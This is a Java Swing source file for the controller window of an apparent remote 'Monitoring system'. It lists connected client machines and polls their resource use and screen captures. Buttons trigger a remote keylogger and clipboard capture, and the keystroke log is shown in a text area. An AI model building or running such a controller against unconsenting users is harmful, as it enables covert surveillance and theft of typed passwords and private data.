package swing;

import admin.Admin;
import models.SystemInfoModel;
import swing.ContextMenu.test;
import swing.button.ButtonCustom;
import swing.notification.Notification;
import swing.progressbar.ProgressBarCustom;
import swing.table.TableCustom;
import utils.console;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import static utils.Command.*;

public class DashboardGUI extends JFrame {
    private static Admin admin;
    /**
     * Components
     */
    private JPanel main;
    private JTable table;
    private JScrollPane jscrollpane;
    private JPanel header;
    private JPanel footer;
    private JPanel body;
    private ButtonCustom buttonCustom1;
    private JPanel right;
    private JPanel left;
    private JLabel lbl_title_disk;
    private JLabel lbl_title_ram;
    private JLabel lbl_title_cpu;
    private JLabel lbl_title_uuid;
    private JLabel lbl_cpu;
    private JLabel lbl_ram;
    private JLabel lbl_disk;
    private JPanel pnl_client_action;
    private JPanel pnl_client_information;
    private JPanel pnl_client_progress_bar;
    private ProgressBarCustom pgb_cpu;
    private ProgressBarCustom pgb_ram;
    private ProgressBarCustom pgb_disk;
    private JLabel lbl_title_ip;
    private JLabel lbl_ip;
    private JPanel pnl_client_screen;
    private JPanel pnl_client_log;
    private JLabel lbl_image;
    private JTextArea txt_area_keylogger;
    private ButtonCustom btn_clipboard;
    private ButtonCustom btn_keylogger;
    private JTextField txt_id;
    private JTextField txt_cpu;
    private JTextField txt_ram;
    private JTextField txt_disk;
    private JTextField txt_ip;

    private static DefaultTableModel defaultTableModel = new DefaultTableModel();
    private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
    private String currentClientId;
    private static Notification panel;
    public DashboardGUI() throws Exception {
        (admin = new Admin(this)).start();
        this.initFrame();
        panel = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER, "Client has disconnect!");
        txt_id.setBorder(new EmptyBorder(0,0,0,0));
        txt_cpu.setBorder(new EmptyBorder(0,0,0,0));
        txt_ram.setBorder(new EmptyBorder(0,0,0,0));
        txt_disk.setBorder(new EmptyBorder(0,0,0,0));
        txt_ip.setBorder(new EmptyBorder(0,0,0,0));
        jscrollpane.setPreferredSize(new Dimension( 600 , 500));
        table.setModel(defaultTableModel);
        TableCustom.apply(jscrollpane, TableCustom.TableType.MULTI_LINE);
        ImageIcon imageIcon = new ImageIcon(new ImageIcon("/test4.jpg").getImage().getScaledInstance(350, 210, Image.SCALE_SMOOTH));
        this.lbl_image.setIcon(imageIcon);
    }

    public void sync() {
        panel.setMessageText(String.format("Client [%s] has disconnected!", currentClientId.substring(0, currentClientId.length()/2)));
        int rowCount = defaultTableModel.getRowCount();
        for (int i = rowCount - 1; i >= 0; i--) {
            if (defaultTableModel.getValueAt(i, 0).equals(currentClientId)) defaultTableModel.removeRow(i);
        }
        currentClientId = null;
        panel.showNotification();
        txt_id.setText(null);
        txt_cpu.setText(null);
        txt_ram.setText(null);
        txt_disk.setText(null);
        txt_ip.setText(null);
        pgb_cpu.setValue(0);
        pgb_ram.setValue(0);
        pgb_disk.setValue(0);
        txt_area_keylogger.setText(null);
    }

    private void initFrame() throws InterruptedException {
        /**
         * Frame config
         */
        this.setSize(1200, 800);
        this.setResizable(true);
        this.setContentPane(main);
        this.setLocationRelativeTo(null);
        this.setTitle("Monitoring system");
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        /**
         * Panel config
         */
        this.main.setBackground(Color.WHITE);
        this.right.setBackground(Color.WHITE);
        this.left.setBackground(Color.WHITE);
        this.header.setBackground(Color.WHITE);
        this.body.setBackground(Color.WHITE);
        this.footer.setBackground(Color.WHITE);
        this.pnl_client_progress_bar.setBackground(Color.WHITE);
        this.pnl_client_information.setBackground(Color.WHITE);
        this.pnl_client_action.setBackground(Color.WHITE);
        /**
         * Table config
         */
        this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        defaultTableModel.setColumnIdentifiers(tableHeaders);
        this.table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
            public void valueChanged(ListSelectionEvent e) {
                int selectedRow = table.getSelectedRow();
                if (selectedRow == -1) {
                    return;
                }
                currentClientId = (String) table.getValueAt(selectedRow, 0);
                SystemInfoModel client = admin.getClients().get(currentClientId);
                txt_id.setText(currentClientId);
                txt_ram.setText(client.getRam());
                txt_disk.setText(client.getDisk());
                txt_cpu.setText(client.getCpu());
                txt_ip.setText(client.getIp());

                console.info("[CURRENT CLIENT] " + currentClientId);
            }

        });
        /**
         * ActionListener config
         */
        this.btn_clipboard.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_CLIPBOARD);
            }
        });
        this.btn_keylogger.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_KEYLOGGER);
            }
        });

        test.addDefaultContextMenu(txt_area_keylogger);
        /**
         * Threading config
         */
        new Thread(this::fetch).start();
        new Thread(this::monitoring).start();
        new Thread(this::screen).start();
    }

    public void monitoring() {
        while (true) {
            console.warn("MONITORING FETCHING...");
            try {
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_MONITORING);
                }
                Thread.currentThread().sleep(2000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public void fetch() {
        while (true) {
            console.warn("GUI FETCHING...");
            try {
                (defaultTableModel = new DefaultTableModel()).setColumnIdentifiers(tableHeaders);
                admin.getClients().forEach((key, value) -> {
                    defaultTableModel.addRow(new Object[]{
                            key,
                            value.getHostName(),
                            value.getOs(),
                            value.getMAC_address(),
                            value.getIp()});
                });
                table.setModel(defaultTableModel);
                Thread.currentThread().sleep(5000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void screen() {
        while (true) {
            console.warn("SCREEN FETCHING...");
            try {
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_CLIENT_SCREEN);
                }
                Thread.currentThread().sleep(1000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }
    public void updateClientScreen(ImageIcon imageIcon) {
        lbl_image.setIcon(new ImageIcon(imageIcon.getImage().getScaledInstance(350, 210, Image.SCALE_SMOOTH)));
    }
    public void updateProgressBar(int cpu, int ram, int disk) {
        this.pgb_cpu.setValue(cpu);
        this.pgb_ram.setValue(ram);
        this.pgb_disk.setValue(disk);
    }

    public void appendLog(String message) {
        txt_area_keylogger.append(message + "\n");
    }

    public String getCurrentClientId() {
        return currentClientId;
    }
}
